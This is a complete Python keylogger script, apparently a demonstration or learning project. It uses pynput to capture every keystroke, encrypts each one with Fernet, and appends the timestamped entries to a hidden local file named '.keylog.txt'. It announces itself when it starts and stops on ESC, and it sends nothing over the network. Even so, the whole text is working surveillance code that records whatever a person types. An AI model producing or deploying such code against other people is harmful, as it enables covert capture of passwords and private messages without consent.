# keylogger.py — Captures keystrokes, encrypts with Fernet, logs with timestamps

from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import base64
import os
import sys

# Step 1: Load encryption key
key_path = "key.key"
if not os.path.exists(key_path):
    print("❌ Encryption key not found. Please run keygen.py first.")
    sys.exit(1)

with open(key_path, "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)

# Step 2: Output log file
log_file = ".keylog.txt"  # Hidden log file for realism

# Step 3: Encrypt and write log
def write_encrypted_log(data):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {data}\n"
    encrypted = fernet.encrypt(log_entry.encode())
    with open(log_file, "ab") as file:
        file.write(base64.b64encode(encrypted) + b"\n")

# Step 4: Key press handler
def on_press(key):
    if key == keyboard.Key.esc:
        print("🛑 Keylogger stopped.")
        return False
    try:
        write_encrypted_log(key.char)
    except AttributeError:
        write_encrypted_log(f"[{key.name}]")

# Step 5: Start listener
print("🟢 Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
